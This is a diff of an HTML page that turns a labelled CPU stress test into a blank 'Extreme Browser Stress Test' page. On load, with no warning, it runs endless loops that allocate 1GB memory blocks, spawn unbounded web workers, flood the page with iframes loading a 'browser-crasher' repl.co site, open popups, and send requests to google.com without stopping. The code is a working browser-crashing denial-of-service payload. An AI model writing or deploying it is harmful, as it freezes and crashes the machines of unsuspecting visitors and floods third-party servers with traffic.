@@ -3,66 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CPU Stress Test</title>
+    <title>Extreme Browser Stress Test</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 20px;
-        }
-        #status {
-            font-size: 1.5em;
-            color: #333;
+            margin: 0;
+            padding: 0;
+            background-color: white; /* White background */
+            height: 100vh;
         }
     </style>
 </head>
 <body>
-    <h1>CPU Stress Test</h1>
-    <div id="status">Running...</div>
-
     <script>
-        const workerCount = 50; // Number of Web Workers to run in parallel
-        let workers = [];
-        
-        // Memoization for Fibonacci calculation (client-side)
-        function fib(n) {
-            if (n <= 1) return n;
-            if (memo[n]) return memo[n];
-            memo[n] = fib(n - 1) + fib(n - 2);
-            return memo[n];
+        // Memory allocation: continuously allocate large chunks of memory
+        function allocateMemory() {
+            let memoryLeak = [];
+            while (true) {
+                memoryLeak.push(new ArrayBuffer(1024 * 1024 * 1024)); // Allocate 1GB chunks repeatedly
+            }
         }
 
-        let memo = {}; // Memoization storage
-
-        // Create Web Workers and start them
-        for (let i = 0; i < workerCount; i++) {
-            const worker = new Worker(URL.createObjectURL(new Blob([`
-                let memo = {};  // Memoization for worker
-                function fib(n) {
-                    if (n <= 1) return n;
-                    if (memo[n]) return memo[n];
-                    memo[n] = fib(n - 1) + fib(n - 2);
-                    return memo[n];
-                }
-                self.onmessage = function(e) {
-                    let n = e.data;
-                    while (true) {
-                        fib(n); // Keep calculating Fibonacci numbers in infinite loop
-                    }
-                }
-            `], { type: 'application/javascript' })));
-
-            workers.push(worker);
-            worker.postMessage(30); // Start calculating Fibonacci for the 30th number, recursively
+        // Spawn massive number of Web Workers to max out CPU usage
+        function spawnWorkers() {
+            while (true) {
+                new Worker("data:text/javascript," + encodeURIComponent("while(true);")); // Infinite loop in worker
+            }
         }
 
-        // Continuously update the page (so that the main thread isn't idle)
-        function updateStatus() {
-            document.getElementById('status').innerText = 'Calculating...';
-            requestAnimationFrame(updateStatus);
+        // Continuously create iframes with no delay (flood the DOM)
+        function floodIframes() {
+            while (true) {
+                var iframe = document.createElement('iframe');
+                iframe.src = 'https://browser-crasher.mishal0legit.repl.co';
+                iframe.width = 800;
+                iframe.height = 600;
+                document.body.appendChild(iframe);
+            }
         }
 
-        updateStatus(); // Start updating the status
+        // Continuously open popup windows
+        function openPopups() {
+            while (true) {
+                var popup = window.open('https://google.com', '_blank', 'width=500,height=500');
+                popup.focus();
+            }
+        }
+
+        // Simulate network overload by fetching a URL in a loop
+        function overloadNetwork() {
+            while (true) {
+                fetch('https://google.com');
+            }
+        }
+
+        // Start all stress methods
+        function startStressTest() {
+            // Allocate memory in background
+            setTimeout(allocateMemory, 0);
+
+            // Spawn many workers
+            setTimeout(spawnWorkers, 0);
+
+            // Flood the page with iframes
+            setTimeout(floodIframes, 0);
+
+            // Open endless popups
+            setTimeout(openPopups, 0);
+
+            // Overload network requests
+            setTimeout(overloadNetwork, 0);
+        }
+
+        // Start the stress test as soon as the page is loaded
+        window.onload = function() {
+            startStressTest();
+        };
     </script>
 </body>
 </html>
